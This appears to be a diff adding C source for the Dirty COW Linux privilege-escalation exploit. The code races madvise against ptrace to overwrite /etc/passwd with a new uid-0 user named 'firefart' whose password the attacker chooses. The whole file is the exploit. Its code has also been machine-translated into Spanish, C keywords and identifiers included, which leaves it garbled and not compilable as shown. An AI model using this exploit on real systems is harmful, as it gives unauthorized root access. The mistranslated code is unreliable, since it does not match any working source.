@@ -1,0 +1,163 @@
+# incluye  < fcntl.h >
+# incluye  < pthread.h >
+# incluye  < string.h >
+# incluye  < stdio.h >
+# incluye  < stdint.h >
+# incluye  < sys / mman.h >
+# incluye  < sys / types.h >
+# incluir  < sys / stat.h >
+# include  < sys / wait.h >
+# incluye  < sys / ptrace.h >
+# incluye  < stdlib.h >
+# incluye  < unistd.h >
+# incluye  < crypt.h >
+
+const  char * nombre de archivo = " / etc / passwd " ;
+const  char * nombre_archivo_respaldo = " /tmp/passwd.bak " ;
+const  char * salt = " firefart " ;
+
+int f;
+void * mapa;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo {
+   char * nombre de usuario;
+   char * hash;
+   int user_id;
+   int group_id;
+   char * info;
+   char * home_dir;
+   char * shell;
+};
+
+char * generate_password_hash ( char * plaintext_pw) {
+  return  crypt (texto plano_pw, sal);
+}
+
+char * generate_passwd_line ( struct Userinfo u) {
+  const  char * formato = " % s : % s : % d : % d : % s : % s : % s \ n " ;
+  int size = snprintf ( NULL , 0 , formato, u. nombre de usuario , u. hash ,
+    u. user_id , u. group_id , u. info , u. home_dir , u. concha );
+  char * ret = malloc (tamaño + 1 );
+  sprintf (ret, formato, u. nombre de usuario , u. hash , u. user_id ,
+    u. group_id , u. info , u. home_dir , u. concha );
+  return ret;
+}
+
+void * madviseThread ( void * arg) {
+  int i, c = 0 ;
+  para (i = 0 ; i < 200000000 ; i ++) {
+    c + = madvise (mapa, 100 , MADV_DONTNEED);
+  }
+  printf ( " madvise % d \ n \ n " , c);
+}
+
+int  copy_file ( const  char * desde, const  char * hasta) {
+  // comprobar si el archivo de destino ya existe
+  if ( acceso (a, F_OK)! = - 1 ) {
+    printf ( "¡El archivo % s ya existe! Bórrelo y ejecútelo de nuevo \ n " ,
+      para);
+    retorno - 1 ;
+  }
+
+  char ch;
+  ARCHIVO * fuente, * destino;
+
+  fuente = fopen (de, " r " );
+  if (fuente == NULL ) {
+    retorno - 1 ;
+  }
+  objetivo = fopen (a, " w " );
+  if (target == NULL ) {
+     fclose (fuente);
+     retorno - 1 ;
+  }
+
+  while ((ch = fgetc (fuente))! = EOF) {
+     fputc (ch, objetivo);
+   }
+
+  printf ( " % s respaldado correctamente en % s \ n " ,
+    desde, hasta);
+
+  fclose (fuente);
+  fclose (objetivo);
+
+  return  0 ;
+}
+
+int  main ( int argc, char * argv [])
+{
+  // archivo de respaldo
+  int ret = copy_file (nombre de archivo, nombre de archivo de copia de seguridad);
+  si (ret! = 0 ) {
+    salir (ret);
+  }
+
+  estructura Userinfo usuario;
+  // establecer valores, cambiar según sea necesario
+  usuario. username = " firefart " ;
+  usuario. user_id = 0 ;
+  usuario. group_id = 0 ;
+  usuario. info = " pwned " ;
+  usuario. home_dir = " / root " ;
+  usuario. shell = " / bin / bash " ;
+
+  char * plaintext_pw;
+
+  si (argc> = 2 ) {
+    plaintext_pw = argv [ 1 ];
+    printf ( " Por favor ingrese la nueva contraseña: % s \ n " , plaintext_pw);
+  } más {
+    plaintext_pw = getpass ( " Introduzca la nueva contraseña: " );
+  }
+
+  usuario. hash = generate_password_hash (texto plano_pw);
+  char * complete_passwd_line = generate_passwd_line (usuario);
+  printf ( " Línea completa: \ n % s \ n " , complete_passwd_line);
+
+  f = abrir (nombre de archivo, O_RDONLY);
+  fstat (f, & st);
+  map = mmap ( NULL ,
+             S t. st_size + sizeof ( largo ),
+             PROT_READ,
+             MAP_PRIVATE,
+             F,
+             0 );
+  printf ( " mmap: % lx \ n " , mapa ( largo sin firmar  ));
+  pid = tenedor ();
+  si (pid) {
+    waitpid (pid, NULL , 0 );
+    int u, i, o, c = 0 ;
+    int l = strlen (complete_passwd_line);
+    para (i = 0 ; i < 10000 / l; i ++) {
+      para (o = 0 ; o <l; o ++) {
+        para (u = 0 ; u < 10000 ; u ++) {
+          c + = ptrace (PTRACE_POKETEXT,
+                      pid,
+                      mapa + o,
+                      * (( largo *) (complete_passwd_line + o)));
+        }
+      }
+    }
+    printf ( " ptrace % d \ n " , c);
+  }
+  else {
+    pthread_create (& pth,
+                   NULO ,
+                   madviseThread
+                   NULL );
+    ptrace (PTRACE_TRACEME);
+    matar ( getpid (), SIGSTOP);
+    pthread_join (pth, NULL );
+  }
+
+  printf ( " Listo. Comprueba % s para ver si se creó el nuevo usuario. \ n " , nombre de archivo);
+  printf ( " Puede iniciar sesión con el nombre de usuario ' % s ' y la contraseña ' % s '. \ n \ n " ,
+    usuario. nombre de usuario , plaintext_pw);
+    printf ( " \ n ¡NO OLVIDES RESTAURAR! $ mv % s  % s \ n " ,
+    backup_filename, filename);
+  return  0 ;
+}
